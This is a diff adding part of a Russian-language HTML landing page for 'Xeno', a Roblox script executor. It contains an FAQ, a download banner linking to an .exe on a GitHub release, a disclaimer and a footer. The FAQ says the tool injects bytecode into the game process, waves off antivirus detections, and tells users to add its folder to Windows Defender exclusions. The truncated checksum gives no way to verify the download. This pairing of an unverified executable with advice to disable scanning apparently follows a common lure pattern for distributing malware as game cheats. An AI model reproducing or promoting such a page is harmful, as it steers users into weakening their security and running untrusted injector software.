+              <p data-i18n="faq_a2">Любой инжектор выполняет чтение памяти процесса и внедрение байткода, что классифицируется стандартными эвристическими сканерами как RiskWare / HackTool. В Xeno нет вирусов, троянов и майнеров. Рекомендуется добавить папку в исключения Windows Defender.</p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-question">
+              <span data-i18n="faq_q3">Как запустить скрипт через Xeno?</span>
+              <span class="faq-arrow">+</span>
+            </button>
+            <div class="faq-answer">
+              <p data-i18n="faq_a3">1. Запустите Roblox и зайдите в желаемый плейс.<br>2. Откройте Xeno.exe (он автоматически привяжется к процессу).<br>3. Выберите скрипт из встроенного каталога или вставьте свой в поле ввода и нажмите кнопку «Execute».</p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-question">
+              <span data-i18n="faq_q4">Работает ли Xeno после еженедельных обновлений игры?</span>
+              <span class="faq-arrow">+</span>
+            </button>
+            <div class="faq-answer">
+              <p data-i18n="faq_a4">Да. Наш лоадер автоматически обновляет оффсеты и подписи функций через облачный сервер без необходимости вручную перекачивать весь архив.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Download Section (Call To Action) -->
+    <section class="section download-section" id="download">
+      <div class="container">
+        <div class="download-banner">
+          <div class="download-glow"></div>
+          <div class="download-content">
+            <div class="sub-badge light" data-i18n="dl_badge">Версия 1.3.65 Stable</div>
+            <h2 class="download-title" data-i18n="dl_title">Готов испытать Xeno в деле?</h2>
+            <p class="download-desc" data-i18n="dl_desc">
+              Скачай официальный инсталлятор прямо сейчас. Никаких подписок, рекламы и скрытых ограничений.
+            </p>
+
+            <div class="download-actions">
+              <a href="https://github.com/NoxClient/xenoloader/releases/download/123/Xeno-v1.3.65.exe" class="btn btn-primary btn-xl download-link" id="mainDownloadBtn">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                  <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                  <polyline points="7 10 12 15 17 10"></polyline>
+                  <line x1="12" y1="15" x2="12" y2="3"></line>
+                </svg>
+                <span data-i18n="dl_btn_exe">Скачать Xeno Installer (.exe)</span>
+              </a>
+            </div>
+
+            <div class="download-specs">
+              <span data-i18n="dl_spec_plat">Платформа: Windows 10 / 11 (x64, ARM64)</span>
+              <span>•</span>
+              <span data-i18n="dl_spec_size">Размер: ~18.4 МБ</span>
+              <span>•</span>
+              <span>SHA-256: 7f8a9...b14c</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Disclaimer / Agreement Notice -->
+    <section class="agreement-section" id="agreement">
+      <div class="container">
+        <div class="agreement-box">
+          <h4 data-i18n="agr_title">Пользовательское соглашение и отказ от ответственности</h4>
+          <p data-i18n="agr_text">
+            Xeno Executor разрабатывается независимой исследовательской группой в образовательных целях для анализа исполнения скриптов Luau и тестирования устойчивости клиентского кода. Roblox является зарегистрированной торговой маркой Roblox Corporation. Данный проект никоим образом не связан, не спонсируется и не одобрен Roblox Corporation. Используя данное ПО, вы подтверждаете соблюдение местного законодательства и берете на себя ответственность за использование учетных записей.
+          </p>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="container footer-container">
+      <div class="footer-brand">
+        <a href="#" class="logo">
+          <span class="logo-mark">X</span>
+          <span class="logo-text">XENO</span>
+        </a>
+        <p class="footer-tagline" data-i18n="foot_tagline">Свобода кастомизации и исполнения кода в Roblox.</p>
+        <p class="copyright">© 2026 Xeno Team. Все права сохранены.</p>
+      </div>
+
+      <div class="footer-col">
+        <h4 data-i18n="foot_nav">Навигация</h4>
+        <a href="#features" data-i18n="nav_features">Возможности</a>
+        <a href="#games" data-i18n="nav_games">Каталог скриптов</a>
+        <a href="#benchmarks" data-i18n="nav_benchmarks">UNC Тесты</a>
+        <a href="#download" data-i18n="foot_downloads">Загрузки</a>
+      </div>
+
+      <div class="footer-col">
+        <h4 data-i18n="foot_community">Сообщество</h4>
+        <a href="https://discord.com" target="_blank" rel="noopener">Discord Сервер</a>
+        <a href="https://t.me" target="_blank" rel="noopener">Telegram Канал</a>
+        <a href="https://github.com" target="_blank" rel="noopener">GitHub Репозиторий</a>
+      </div>
+
+      <div class="footer-col">
+        <h4 data-i18n="foot_support">Поддержка</h4>
+        <a href="#faq" data-i18n="foot_kb">База знаний</a>
+        <a href="#agreement" data-i18n="foot_security">Политика безопасности</a>
+        <a href="mailto:support@xeno.local" data-i18n="foot_contacts">Контакты команды</a>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Toast Notification -->
+  <div class="toast" id="toast">
+    <div class="toast-icon">✓</div>
+    <div class="toast-text" id="toastText">Загрузка запущена!</div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
